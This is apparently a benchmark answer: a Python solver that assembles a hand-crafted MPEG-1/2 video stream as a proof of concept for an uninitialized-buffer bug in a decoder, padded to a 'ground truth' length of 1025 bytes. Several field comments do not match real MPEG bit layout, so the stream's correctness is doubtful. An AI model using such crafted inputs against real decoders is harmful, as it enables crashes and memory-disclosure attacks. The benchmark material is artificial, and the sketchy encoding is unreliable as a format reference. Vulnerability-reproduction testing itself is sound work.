import os
import subprocess
import tempfile
import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Create a minimal valid MPEG-1/2 video elementary stream
        # Structure designed to trigger uninitialized buffer padding
        poc = bytearray()
        
        # MPEG sequence header
        poc.extend(b'\x00\x00\x01\xb3')  # sequence_start_code
        poc.extend(b'\x14\x00')          # horizontal_size (5120) - triggers large buffer
        poc.extend(b'\x0e\x00')          # vertical_size (3584)
        poc.extend(b'\x1f\xff')          # aspect_ratio and frame_rate
        poc.extend(b'\xff\xff')          # bitrate
        poc.extend(b'\x00')              # marker
        poc.extend(b'\x01')              # constrained_parameters_flag
        poc.extend(b'\x00')              # load_intra_quantiser_matrix
        poc.extend(b'\xff')              # intra_quantiser_matrix (dummy)
        
        # Sequence extension for MPEG-2
        poc.extend(b'\x00\x00\x01\xb5')  # extension_start_code
        poc.extend(b'\x12\x00')          # profile_and_level + progressive_sequence
        poc.extend(b'\x01')              # chroma_format
        poc.extend(b'\x01')              # horizontal_size_extension
        poc.extend(b'\x01')              # vertical_size_extension
        poc.extend(b'\x00')              # bitrate_extension
        poc.extend(b'\x00')              # vbv_buffer_size_extension
        poc.extend(b'\x01')              # low_delay
        poc.extend(b'\x01')              # frame_rate_extension_n
        poc.extend(b'\x01')              # frame_rate_extension_d
        
        # GOP header
        poc.extend(b'\x00\x00\x01\xb8')  # group_start_code
        poc.extend(b'\x00')              # time_code
        poc.extend(b'\x00')              # closed_gop
        poc.extend(b'\x00')              # broken_link
        
        # Picture header
        poc.extend(b'\x00\x00\x01\x00')  # picture_start_code
        poc.extend(b'\x00\x10')          # temporal_reference and picture_coding_type
        poc.extend(b'\x00\x00')          # vbv_delay
        
        # Picture coding extension
        poc.extend(b'\x00\x00\x01\xb5')  # extension_start_code
        poc.extend(b'\x14')              # f_code[0][0] and f_code[0][1]
        poc.extend(b'\x14')              # f_code[1][0] and f_code[1][1]
        poc.extend(b'\x01')              # intra_dc_precision
        poc.extend(b'\x03')              # picture_structure
        poc.extend(b'\x01')              # top_field_first
        poc.extend(b'\x01')              # frame_pred_frame_dct
        poc.extend(b'\x01')              # concealment_motion_vectors
        poc.extend(b'\x01')              # q_scale_type
        poc.extend(b'\x01')              # intra_vlc_format
        poc.extend(b'\x01')              # alternate_scan
        poc.extend(b'\x01')              # repeat_first_field
        poc.extend(b'\x01')              # chroma_420_type
        poc.extend(b'\x01')              # progressive_frame
        
        # Slice header
        poc.extend(b'\x00\x00\x01\x01')  # slice_start_code (first slice)
        poc.extend(b'\x0a')              # quantiser_scale_code
        
        # Minimal macroblock data - just enough to trigger buffer allocation
        # Using intra-coded macroblock with minimal data
        poc.extend(b'\x10')              # macroblock_address_increment = 1
        poc.extend(b'\x08')              # macroblock_type = intra
        
        # DCT coefficients
        poc.extend(b'\x8c')              # dct_dc_size_luminance = 8
        poc.extend(b'\xff\xff\xff\xff')  # dummy dc coefficient
        poc.extend(b'\x00')              # end_of_block
        
        # End of slice
        poc.extend(b'\x00\x00\x01\xb7')  # sequence_end_code
        
        # Pad to exactly 1025 bytes to match ground truth length
        current_len = len(poc)
        if current_len < 1025:
            # Add padding that will remain uninitialized in output buffer
            # Use pattern that's likely to trigger sanitizer if read
            padding = bytes([0x41] * (1025 - current_len))
            poc.extend(padding)
        elif current_len > 1025:
            poc = poc[:1025]
            
        return bytes(poc)
